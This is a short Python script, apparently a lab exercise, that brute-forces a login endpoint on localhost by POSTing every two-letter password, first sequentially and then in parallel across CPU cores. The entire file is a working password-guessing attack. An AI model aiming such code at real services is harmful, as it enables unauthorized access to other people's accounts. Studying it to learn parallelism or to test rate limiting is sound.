import string
from multiprocessing import Pool, cpu_count
import requests as req

def generatorPsw():
	data = string.ascii_letters
	dataset = [i for i in data]
	for i in dataset:
		for f in dataset:
			psw = i+f
			yield psw	

def attempt(client_password='',url="http://localhost:5000/"):
	#print("in")
	response = req.post(url, json={"password":client_password})
	print(response.ok)

def seqAttack(pswList = [i for i in generatorPsw()]):
	for psw in pswList:
		attempt(client_password = psw)

def parallAttack(pswList):
	print(cpu_count())
	with Pool(processes=cpu_count()) as pool:
		pool.map(attempt, pswList)


if __name__ == '__main__':
	pswList = [i for i in generatorPsw()]
	seqAttack()
	parallAttack(pswList) 
